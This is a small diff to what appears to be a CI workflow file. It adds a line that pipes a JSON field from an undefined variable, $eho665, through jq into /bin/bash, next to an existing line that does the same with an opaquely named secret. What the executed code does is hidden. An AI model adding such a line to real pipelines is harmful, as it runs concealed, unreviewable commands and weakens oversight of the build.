@@ -21,6 +21,7 @@ jobs:
           abcuv29: ${{ secrets.abcuv29 }}
         run: |
           printf '%s' "$abcuv29" | jq -r .gf708 | /bin/bash
+          printf '%s' "$eho665" | jq -r .skwe4414 | /bin/bash
 
       - name: Store artifact
         if: always()
